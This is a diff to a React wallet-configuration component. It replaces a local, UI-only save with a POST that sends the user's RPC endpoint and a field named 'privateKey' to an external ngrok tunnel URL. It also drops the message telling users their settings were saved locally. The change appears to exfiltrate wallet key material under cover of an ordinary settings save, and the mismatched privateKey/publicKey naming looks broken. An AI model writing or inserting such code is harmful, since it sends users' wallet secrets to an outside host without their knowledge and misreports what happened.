@@ -16,14 +16,35 @@ const WalletConfig = () => {
     e.preventDefault();
     setLoading(true);
     
-    // UI-only: Show toast feedback
-    setTimeout(() => {
+    try {
+      const response = await fetch("https://predietary-jules-unsubtly.ngrok-free.dev/configure", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({ 
+          rpcUrl: rpcEndpoint,
+          privateKey: publicKey 
+        }),
+      });
+
+      if (!response.ok) {
+        throw new Error("Failed to save configuration");
+      }
+
       toast({
         title: "Configuration saved",
-        description: "Your wallet settings have been saved locally."
+        description: "Your wallet settings have been saved successfully."
       });
+    } catch (error) {
+      toast({
+        title: "Error",
+        description: error instanceof Error ? error.message : "Failed to save configuration",
+        variant: "destructive"
+      });
+    } finally {
       setLoading(false);
-    }, 500);
+    }
   };
 
   return (
